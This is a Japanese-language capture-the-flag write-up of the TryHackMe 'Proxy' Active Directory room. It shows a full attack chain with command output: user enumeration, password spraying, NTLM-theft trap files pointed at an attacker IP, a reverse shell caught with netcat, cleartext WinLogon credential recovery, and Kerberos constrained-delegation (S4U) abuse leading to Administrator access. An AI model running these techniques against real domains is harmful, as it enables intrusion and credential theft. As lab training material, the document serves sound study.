# Proxy CTF

https://tryhackme.com/room/proxychallenge

## Enumeration

```shell
TARGET=10.146.189.100
sudo bash -c "echo $TARGET   proxy.thm >> /etc/hosts"
```

### ポートスキャン

```sh
nmap -v -p- -Pn --min-rate 10000 $TARGET

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknown
49808/tcp open  unknown
```

### SMB, NFS, LDAP etc

ユーザー列挙

```sh
$ lookupsid.py DC01.ctf.local/guest@$TARGET
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.146.189.100
[*] StringBinding ncacn_np:10.146.189.100[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1966530601-3185510712-10604624
498: CTF\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CTF\Administrator (SidTypeUser)
501: CTF\Guest (SidTypeUser)
502: CTF\krbtgt (SidTypeUser)
512: CTF\Domain Admins (SidTypeGroup)
513: CTF\Domain Users (SidTypeGroup)
514: CTF\Domain Guests (SidTypeGroup)
515: CTF\Domain Computers (SidTypeGroup)
516: CTF\Domain Controllers (SidTypeGroup)
517: CTF\Cert Publishers (SidTypeAlias)
518: CTF\Schema Admins (SidTypeGroup)
519: CTF\Enterprise Admins (SidTypeGroup)
520: CTF\Group Policy Creator Owners (SidTypeGroup)
521: CTF\Read-only Domain Controllers (SidTypeGroup)
522: CTF\Cloneable Domain Controllers (SidTypeGroup)
525: CTF\Protected Users (SidTypeGroup)
526: CTF\Key Admins (SidTypeGroup)
527: CTF\Enterprise Key Admins (SidTypeGroup)
553: CTF\RAS and IAS Servers (SidTypeAlias)
571: CTF\Allowed RODC Password Replication Group (SidTypeAlias)
572: CTF\Denied RODC Password Replication Group (SidTypeAlias)
1008: CTF\DC01$ (SidTypeUser)
1109: CTF\DnsAdmins (SidTypeAlias)
1110: CTF\DnsUpdateProxy (SidTypeGroup)
1111: CTF\svc.scanner (SidTypeUser)
1112: CTF\svc.mssql (SidTypeUser)
1113: CTF\helpdesk.bob (SidTypeUser)
1114: CTF\it.admin (SidTypeUser)
```

DNS動的更新は拒否された。

```sh
$ nsupdate                                                 
> server 10.146.189.100
> update add test.ctf.local 600 A 192.168.131.34
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
test.ctf.local.         600     IN      A       192.168.131.34

> send
update failed: REFUSED
```

## kerberos

svc.scanner, svc.mssql は有効なユーザー。

```sh
$ ~/tools/kerbrute userenum --dc $TARGET -d ctf.local User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/15/26 - Ronnie Flathers @ropnop

2026/07/15 21:13:00 >  Using KDC(s):
2026/07/15 21:13:00 >   10.146.189.100:88

2026/07/15 21:13:00 >  [+] VALID USERNAME:       svc.scanner@ctf.local
2026/07/15 21:13:00 >  [+] VALID USERNAME:       svc.mssql@ctf.local
2026/07/15 21:13:00 >  Done! Tested 5 usernames (2 valid) in 0.130 seconds
```

ユーザー名とパスワードが一致しているパターンを探したら、DnsUpdateProxy ユーザーがそうだった（あとから気づいたが、パスワードなし設定になっていた）。Kerbruteで有効ではなかったが・・・？

```sh
$ crackmapexec smb $TARGET -u ./User.txt -p ./User.txt --no-bruteforce
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing LDAP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.146.189.100  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False)
SMB         10.146.189.100  445    DC01             [+] ctf.local\DnsUpdateProxy:DnsUpdateProxy
```

SMBで共有を探す。

```sh
$ smbclient -L //$TARGET -U "DnsUpdateProxy"
Password for [WORKGROUP\DnsUpdateProxy]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT-Shared       Disk      IT Department Shared Resources
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.146.189.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

3ファイル発見。

```sh
$ smbclient //$TARGET/IT-Shared -U "DnsUpdateProxy" 
Password for [WORKGROUP\DnsUpdateProxy]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu May 21 23:19:03 2026
  ..                                  D        0  Thu May 21 23:19:03 2026
  IT-Credentials-Backup.txt           A      406  Thu May 21 23:18:15 2026
  IT-Onboarding-Checklist.txt         A      676  Thu May 21 23:18:16 2026
  IT-Portal.html                      A     4887  Thu May 21 23:19:03 2026
```

２ユーザーは無効になっている。

```sh
$ cat IT-Credentials-Backup.txt 
IT Department - Credentials Backup
===================================
Generated: 2019-08-14
Status: ARCHIVED (accounts disabled pending security review)

  helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
  it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]

NOTE: These accounts have been disabled. Active service accounts
      are managed separately by the sysadmin team.
```

svc.scanner が、IT-Shared のファイルを処理しているとのこと。アイコンを読んでいるあたりがヒントか？

```sh
$ cat ./IT-Onboarding-Checklist.txt 
IT Department Onboarding Checklist
====================================
Welcome to the team!

1. Get VPN access from sysadmin
2. Request AD account
3. Install tools (see software list on intranet)
4. Review security policies

Automated Services
------------------
  File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
    Contact sysadmin if files are not being processed.

  Database Backup (svc.mssql)
    Handles nightly MSSQL backups. Member of Backup Operators.
    Password rotated quarterly -- do not store locally.

Questions? Email helpdesk@ctf.local
```

ntlm_theft でトラップファイルを作って lnk, url を配置してみたが、Responderにリクエストが来なかった。

```sh
$ python ./ntlm_theft.py --generate all --server 192.168.131.34 --filename project

$ ls project                                                          
 Autorun.inf                    project.htm                     'project-(remotetemplate).docx'
 desktop.ini                   'project-(icon).url'              project.rtf
 project.application           'project-(includepicture).docx'   project.scf
 project.asx                    project.jnlp                    'project-(stylesheet).xml'
'project-(externalcell).xlsx'   project.library-ms               project.theme
'project-(frameset).docx'       project.lnk                     'project-(url).url'
'project-(fulldocx).xml'        project.m3u                      project.wax
'project-(handler).htm'         project.pdf                      zoom-attack-instructions.txt
```

リバースシェルの ps1 ファイルを配置したらリバースシェルをとれた。

```sh
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.131.34] from (UNKNOWN) [10.146.189.100] 63293
whoami
ctf\svc.scanner
PS C:\Windows\system32> 
```

## 権限昇格

めぼしい権限、グループは無い。

```sh
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```sh
PS C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

PrivescCheck.ps1 を実行。svc.scannerのパスワード判明。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
┃ NAME     ┃ Credentials - WinLogon                            ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the 'WinLogon' registry key contains           ┃
┃ clear-text credentials. Note that entries with an empty      ┃
┃ password field are filtered out.                             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Domain   : CTF
Username : svc.scanner
Password : [REDACTED]



[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:00.017
```

使えるかわからないが一応メモ。

```sh
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
┃ NAME     ┃ Hardening - LAPS                                  ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether LAPS is configured and enabled. Note that this ┃
┃ applies to domain-joined machines only.                      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Policy      : Enable local admin password management (LAPS legacy)
Key         : HKLM\Software\Policies\Microsoft Services\AdmPwd
Default     : 0
Value       : (null)
Description : The local administrator password is not managed (default).

Policy      : LAPS > Configure password backup directory
Key         : HKLM\Software\Microsoft\Policies\LAPS
Default     : 0
Value       : (null)
Description : The local administrator password is not backed up (default).



[*] Status: Vulnerable - Severity: Medium - Execution time: 00:00:00.142
```

rdp, smb は見つけたパスワードで認証が通る。

```sh
$ nxc winrm $TARGET -u 'svc.scanner' -p '[REDACTED]'
nxc rdp $TARGET -u 'svc.scanner' -p '[REDACTED]'
nxc smb $TARGET -u 'svc.scanner' -p '[REDACTED]'
...
WINRM       10.146.189.100  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) 
WINRM       10.146.189.100  5985   DC01             [-] ctf.local\svc.scanner:[REDACTED]
RDP         10.146.189.100  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         10.146.189.100  3389   DC01             [+] ctf.local\svc.scanner:[REDACTED] 
SMB         10.146.189.100  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.146.189.100  445    DC01             [+] ctf.local\svc.scanner:[REDACTED] 
```

このパスワードでパスワードスプレーしてみたが、外れ。

```sh
nxc smb $TARGET -u User.txt -p '[REDACTED]' --continue-on-success
```

bloodhound を実行

```sh
$ bloodhound-python -u svc.scanner -p '[REDACTED]' -d ctf.local -ns $TARGET -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ctf.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.ctf.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.ctf.local
INFO: Connecting to LDAP server: dc01.ctf.local
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.ctf.local
INFO: Done in 00M 27S
INFO: Compressing output into 20260715224536_bloodhound.zip
```

DC01 マシンに対して、AllowedToDelegate 権限を持っていることが分かった。

### Kerberos Constrained Delegation (S4U) Abuse

Administrator が cifs/DC01.CTF.LOCAL サービスにアクセスする形のチケットを要求

```sh
$ getST.py -k -impersonate Administrator -spn cifs/DC01.CTF.LOCAL CTF.LOCAL/svc.scanner
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache
```

```sh
$ ls -al ./Admin*
-rw-rw-r-- 1 kali kali 1493 Jul 16 00:59 ./Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache
```

svc.scanner が Administrator の代理として DC01 にアクセスすることを要求する。

```sh
$ export KRB5CCNAME=Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache
$ wmiexec.py CTF.LOCAL/Administrator@DC01.CTF.LOCAL -k -no-pass
Impacket v0.14.0.dev0+20260708.160148.cbcf4f86 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
ctf\administrator

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/20/2026  02:24 AM    <DIR>          .
05/20/2026  02:24 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/20/2026  02:24 AM                41 flag.txt
               3 File(s)          1,122 bytes
               2 Dir(s)  14,590,455,808 bytes free
```

## 振り返り

- Easy に分類されているが、Medium 相当だと感じた。
- Kerbrute で無効とされたユーザーでSMB認証可能だったパターンは初めて見たが、Kerbruteで無効とされた理由は不明。
- Kerberosが久しぶりで、認証情報を得たらBloodhoundというフローをすぐに思い出せなかった。
- AllowedToDelegate を見てもS4Uはすぐに思い出せなかった。Kerberos系の復習が必要。

## Tags

#tags:Windows #tags:Kerberos #tags:AllowedToDelegate
